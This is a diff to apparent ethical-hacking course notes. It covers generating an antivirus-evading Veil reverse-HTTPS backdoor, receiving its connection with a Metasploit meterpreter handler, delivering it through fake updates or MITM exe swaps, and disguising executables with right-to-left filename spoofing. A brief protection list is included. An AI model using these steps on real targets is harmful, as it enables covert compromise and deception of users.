@@ -104,19 +104,70 @@ To use Veil: (use evasion, and use a rev_https (aka reverse https connection)):
 9. if you have a webserver running change to port, a good port is 8080 (an alternate port used by webservers)
 10. `set LPORT 8080`
 11. `options` to see options.
-12. <set PROCESSERS [number(1)]> change processers.
-13. <set SLEEP [number(6)]
-13 <generate> to make backdoor.
 
-- To check if it is detectable you can use the check vt command or better method:
-- go to a website call no distrubute and scan there.
+> For bypassing more antivirus programs, the more options you change, the less likely an existing identified signature is out there, we can change these options with
+    1.  <set PROCESSERS [number(1)]> change processers.
+    2.  <set SLEEP [number(6)]
 
-We need to listen for the connection.
-Need the attack payload and the port (go/meterpeter/rev_https, 8080)
+Finally use `generate` to make backdoor.
 
-1. Open the metasploit framework. <msfconsole>
-2. To listen use the handler moudule
-3. <use exploit/multi/handler>
-4. set the payload <set PAYLOAD windows/meterpeter/reverse_https>
+- To check if it is detectable you can use the check vt command (this will only check signatures)
+- go to <https://nodistribute.com/> and scan there
+
+##### Connecting from the Backdoor
+
+We need to listen for the connection. Need the attack payload and the port (eg, go/meterpeter/rev_https, 8080)
+
+1. Open the metasploit framework. `msfconsole`
+2. To listen use the handler module
+3. `use exploit/multi/handler`
+4. set the payload `set PAYLOAD windows/meterpeter/reverse_https`
 5. set the correct settings (the LPORT and LHOST you used in the backdoor).
-6. <exploit>
+6. `exploit`
+
+Now we wait for the target user to run the backdoor (the `.exe` file).
+
+##### Deploying Backdoors via Fake Updates
+
+By mimicking an update server for a software package, we can hide out backdoor as a new update for a software. To do this we use `Evilgrade` (which is also fully open source): <https://github.com/infobyte/evilgrade>. Once `evilgrade` is installed, you can check hijackable programs using `show modules`, configure options for said modules using `configure [module_name]` and start `evilgrade` with `start`.
+
+This then makes use of MITM attacks such as ARP or DNS spoofing, read more about these in my previous post at [INSERT KALI NETWORK HACKING POST].
+
+> When using evilgrade, ensuring that the exploit is listening before mimicking the update server with the malicious software.
+
+##### Deploying Backdoors via Exe Downloads
+
+Another way to deploy backdoors, is to intercept an `.exe` that is being downloaded on the target and replace it with the malicious `.exe`. It's necessary to be the MITM to undertake this attack.
+
+One way to do this (although unsupported as of 08/2017) is via BDFProxy: <https://github.com/secretsquirrel/BDFProxy>.
+
+Once up and running, whenever a user attempts to download an `.exe`, it'll be intercepted and injected with the malicious backdoor. Note that the target `.exe` will be downloaded and run as normal, not raising any suspicions from the user.
+
+#### Protection
+
+- Ensure that there is no MITM in your network
+- Only download from HTTPS pages
+- Use checksums to ensure the download is as the provider desired it to be (eg, MD5)
+
+### Social Engineering
+
+The definition of social engineering (in information security context) is: "the use of deception to manipulate individuals into divulging confidential or personal information that may be used for fraudulent purposes.". The aim of the game is to gather as much information as possible about our target such that we can better pose an attack.
+
+#### Maltego
+
+Maltego is a piece of software that we can easily & quickly gather information about a target, it can be downloaded from: <https://www.maltego.com/>. It can be used to determine where a specific target has accounts, websites, phone numbers, etc and who they may connect with. It shows all this in a graph representation in the client.
+
+#### Backdooring Any File Type
+
+This is typically done by compiling a malicious script and then disguising it as the source file. Note that this may not work for more technically advanced targets, as when you change the icon for a `.exe` file, there will still be a prompt to run this file when opened.
+
+For example, if you are trying to disguise a PDF, normally users aren't asked to run a PDF when opened, so this may raise suspicions with the target, and potentially foiling the attack.
+
+##### Spoofing File Type
+
+In the above example, we highlighted concerns that our file will prompt to be run and have the extension `.exe`. We can circumvent this problem by spoofing our executable to look as if it was the original file type (eg, `.pdf`). One way to do this is by using the right to left unicode character in the filename (`U+202E`).
+
+So what we will do is if our target file that we want to disguise as is name `the-book-of-reflex.pdf`. We will name our malicious executable as `the-book-of-reflfdp.exe`, and insert a right to left unicode character before `fdp.exe`, which will reverse the end of our file, thus ending up with `the-book-of-reflexe.pdf`.
+
+> Browsers will typically remove the right to left unicode character in file names, so make sure to zip the malicious file to bypass this.
+
